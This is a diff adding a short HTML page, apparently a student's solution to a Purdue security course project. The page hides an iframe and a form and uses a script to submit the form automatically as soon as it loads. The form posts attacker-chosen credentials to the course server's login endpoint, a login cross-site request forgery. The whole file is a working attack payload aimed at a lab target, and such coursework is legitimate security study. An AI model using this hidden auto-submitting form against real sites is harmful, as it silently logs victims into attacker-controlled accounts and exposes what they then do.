@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+			<div style="display:none;">
+				<iframe id="very_safe" name="very_safe"></iframe>
+
+				<form id="danger" method="POST" action="http://cs526-online.cs.purdue.edu/project2b/login?csrfdefense=0&xssdefense=4" target="very_safe">
+					<input type="text" name="username" value="attacker" />
+					<input type="text" name="password" value="123456" />
+					<input type="text" name="csrfdefense" value="0" />
+					<input type="text" name="xssdefense" value="4" />
+				</form>
+
+				<script>
+				document.getElementById("danger").submit();
+				</script>
+			</div>
+	</head>
+</html>
+
